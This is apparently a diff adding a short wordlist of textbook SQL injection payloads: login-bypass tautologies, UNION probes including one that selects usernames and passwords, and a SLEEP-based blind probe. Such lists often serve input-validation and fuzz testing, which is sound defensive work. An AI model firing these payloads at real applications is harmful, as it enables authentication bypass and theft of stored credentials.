@@ -1,0 +1,7 @@
+' OR 1=1 --
+' OR '1'='1
+UNION SELECT NULL
+UNION SELECT username,password
+SLEEP(5)
+1 OR 1=1
+admin'--
